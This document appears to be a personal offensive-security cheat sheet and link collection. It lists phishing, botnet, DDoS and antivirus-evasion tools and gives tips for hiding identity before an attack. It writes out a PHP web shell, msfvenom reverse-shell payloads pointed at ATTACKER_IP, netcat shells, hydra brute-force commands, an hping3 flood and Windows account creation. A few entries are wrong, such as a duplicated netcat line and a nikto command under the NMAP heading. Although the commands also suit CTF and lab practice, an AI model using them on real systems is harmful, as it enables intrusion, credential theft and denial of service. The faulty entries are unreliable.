# CH4RR10t

Resources and cheatsheet collection


---------------------------------
# BROWSER EXTENSIONS
---------------------------------

- FoxyProxy
- Wappalyzer


---------------------------------
# TOOLS
---------------------------------

- Airgeddon
- [Evillimiter [block devices on net.]](https://github.com/bitbrute/evillimiter)
- burpsuite
- [The Lazy Script](https://github.com/arismelachroinos/lscript)
- [blackeye](https://github.com/An0nUD4Y/blackeye)
- setoolkit [Social Engineering Kit]
- sqlmap [SQL injection and vuln. scanner]
- nmap
- ffuf/dirb/gobuster
- Veil evasion [evading virus scanners]
- Metasploit
- [wpscan [wp vuln scanner]](https://wpscan.com/wordpress-security-scanner)
- DNStwist [find registered and available phishing domains]
- [MackPhish [mask phishing urls with real ones like gogle.com]](https://github.com/jaykali/maskphish)
- [Port tunneling [ngrok alternatives]](https://github.com/anderspitman/awesome-tunneling)
- [Remotemeo port tunneling](https://github.com/fasmide/remotemoe)
- Netdiscover [find devices on network]
- [Googler [terminal google search]](https://github.com/jarun/googler)


--------------------------------
# BEFORE AN ATTACK
--------------------------------
- Change your IP
- Use a proxy (Chain Proxy)
- Change your MAC address when running a network-based attack


---------------------------------
# LINKS
---------------------------------

- [Pentesting Bible](https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE)
- [OpenVpn config files](https://www.vpngate.net/en)
- [Offensive security cheatsheet](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
- [infosecn1nja](https://github.com/infosecn1nja)
- [Red-Teaming-Toolkit](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development)
- [Google CTF](https://capturetheflag.withgoogle.com/)
- [Reverse shell cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Reverse shell generator](https://www.revshells.com/)
- [Vulhub vulnerable mackines](https://www.vulnhub.com/)
- [Saphyra DDOS](https://github.com/IkzCx/ProgramsForDDos/blob/master/Saphyra.py)
- [Botnets](https://byob.dev/)
- [Hackxpert web pentesting labs](https://www.hackxpert.com/labs)
- [Hacking articles](https://www.hackingarticles.in/)
- [Anonymous FTP login](https://shahmeeramir.com/penetration-testing-of-an-ftp-server-19afe538be4b)
- [4500+ Vulnerable Google sites](https://sguru.org/ghdb-download-list-4500-google-dorks-free/)


---------------------------------
# CHEATSHEET
---------------------------------

#### Change MAC address
`sudo macchanger -r <INTERFACE>`

### Find IP addresses of target

$ host <SITE/IP>
$ ping <SITE/IP>
$ nslookup <SITE>`

… for additional info(numbers, admin info, physical address, domain info, name servers, registrar info):

`$ whois <SITE>`

#### Find the type of hash

`hash-identifier`

#### FTP Login (with credentials)

`ftp <IP>`

#### Get linux machine info

`uname -a`

### Netcat reverse shell

attacker:

`nc -lnvp <PORT> -s <IP>`

target:

`nc -lnvp <PORT> -s <IP>`

#### Execute PHP shell commands in URL

1. create file [anyname.php]

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

1. upload to server
2. execute commands by going to:

http://<IP>/anyname.php?cmd=<COMMAND>

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4b3de9b-cd1e-42f0-b18b-6137415b15ee/Untitled.png)

#### PORT::3389 OPEN (REMOTE SCREEN CONTROL)

framework: Crowbar

#### Create metasploit TCP reverse shell payload

standard format:

`msfvenom -p <PAYLOAD_PATH> -f <FILE_EXTENSION> -o <FILE_NAME + EXTENSION> LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`

windows target:
`msfvenom -p windows/meterpreter/reverse_tcp -f <FILE_EXTENSION> -o <FILE_NAME + EXTENSION> LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`

android target:
`msfvenom -p android/meterpreter/reverse_tcp -o app.exe LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`

#### Brute-force password

framework: hydra

usage:

`$ hydra --l <NAME> -P <passlist.txt/WORDLIST_PATH> <IP>`

### SAMBA enumeration

Get information from a Samba system (find usernames)

`$ enum4linux -a <IP>`

### List pages on a website/web server

framework: dirb

`$ dirb <URL+http://>`

… with custom wordlist:

`$ dirb <URL+http://> <WORDLIST_PATH>`

framework: ffuf

`$ ffuf -c -w <WORDLIST_PATH> -u <http://+URL+/FUZZ>`

framework: gobuster

`$ gobuster dir -e -u <URL> -w <WORDLIST_PATH>`

### 📌 BRUTE-FORCE PASSWORD

FTP:

`$ hydra -l <USERNAME> -P <WORDLIST_PATH[rockyou]> ftp://<ip>`

### 📌 FTP login

`$ ftp <IP>`

### 📌 FIND HIDDEN FILES IN FILES

`$ binwalk <FILE_PATH>`

### 📌 EXTRACT DATA HIDDEN IN FILES

`$ steghide —extract -sf <FILE_PATH>`

### 📌 DOWNLOAD FILE FROM REMOTE [SSH/FTP]

`$ sudo scp <USERNAME>@<REMOTE_IP>:<FILE_PATH+ext> <LOCAL_PATH>`

eg `└─$ sudo scp [james@10.10.8.132](mailto:james@10.10.8.132):Alien_autospy.jpg ~/Desktop`

### 📌 EXTRACT HIDDEN FILES IN FILES

`$ binwalk <FILE_PATH> -e`

### 📌 UNLOCK ZIPPED FILES

`$ zip2john <ZIP_FILE_PATH> > output.txt`

### 📌 SCAN SPECIFIC FILE EXTENSION

framework: dirb

`$ dirb <IP/URL> -X <.FIlE_EXTENSION>`

### 📌 Getting target/site technologies & versions

framwork: whatweb

`$ whatweb -v <IP/SITE>`

### 📌 BASE64 DECODE

`$ base64 -d <<< <STRING>`

### 📌 RDP (Remote Desktop Protocol) [windows screen acsess]

[if you have password and username(try Administrator/admin)]

`$ freerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.106.116 /u:<USERNAME> /p:'<PSWD>'`

# SCAN FOR OUTDATED SERVICES, SERVER CONFIG, VERSION INFO, VULNERABILITIES

framework: Nikto

usage:

`$ nikto -h <URL/IP>`

scan specific port:

`$ nikto -h <URL/IP> -p <PORT>`

### 📌 START A WEB SERVER

`$ sudo python3 -m http.server 80`

### 📌 NMAP

basic usage:

`$ nikto -h <SITE/IP> -p <PORT>`

vulnerability scan:

`$ nmap --script vuln <IP>`

### 📌 GET FILE TYPE

`$ file <FILE_PATH>`

### 📌 FIND A FILE

`$ find / -type f -name <FILENAME+EXT>`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/869d9b68-cce4-4dc9-b146-07200eb6fe0e/Untitled.png)

### 📌 FOR A STABLE SHELL

`$ python -c ‘import pty;pty.spawn(“/bin/bash”)’`

`Ctrl+Z`

`$ stty raw -echo`

`$ fg`

`$ export TERM=xterm`

### 📌 DOS

`$ sudo hping3 -1 --flood <IP>` [-1 [icmp ping] defuault uses tcp. -S [syn attack] -d <NUMBER_OF_BYTES>]

Low Point Ion Cannon

### 📌 VIEW AND EDIT FILE HEX CONTENT

`$ hexeditor <FILE_PATH>`

### 📌 WINDOWS CREATE USER

`$ net user <USERNAME> <PSWD> /add`

### 📌 PORT INFORMATION

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b8c3363b-e3f3-451a-8f69-3387b23cdcbb/Untitled.png)
